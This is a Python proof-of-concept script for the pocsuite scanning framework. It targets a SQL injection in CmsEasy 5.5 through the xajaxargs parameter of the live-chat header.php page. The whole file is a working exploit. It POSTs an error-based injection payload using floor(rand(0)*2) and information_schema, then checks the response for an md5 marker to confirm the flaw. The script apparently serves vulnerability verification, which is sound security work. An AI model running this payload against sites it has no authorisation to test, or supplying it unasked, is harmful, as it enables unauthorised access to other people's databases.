#!/usr/bin/env python
#coding:utf-8

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class CmsEasyPoc(POCBase):
    vulID = "104"
    version = "1"
    author = "guouopp"
    vulDate = "2018-10-04"
    createDate = "2018-10-04"
    updateDate = "2018-10-04"
    references = ['https://www.seebug.org/vuldb/ssvid-94004']
    name = "CmsEasy header SQL Injection"
    appPowerLink = "http://localhost/cmseasy/"
    appName = "CmsEasy"
    appVersion = "5.5"
    vulType = "SQL Injection"
    desc = '''
        前台在线客服功能页面，xajaxargs参数没有过滤，可进行POST注入
    '''
    samples = []
    install_requires = []

    def _verify(self):
        result = {}
        vul_url = self.url + '/celive/live/header.php'
        payload = {
            'xajax':'LiveMessage',
            'xajaxargs[0][name]':"1',(SELECT 1 FROM (select count(*),concat("
                                  "floor(rand(0)*2),(select md5(233)))a from "
                                  "information_schema.tables group by a)b),"
                                  "'','','','1','127.0.0.1','2') #"
        }
        
        response = req.post(vul_url,data=payload,timeout=30).content
        if 'e165421110ba03099a1c0393373c5b43' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url

        return self.parse_attack(result)


    def _attack(self):
        return self._verify()

    def parse_attack(self,result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail("Internet nothing returned")
        return output
        
register(CmsEasyPoc)
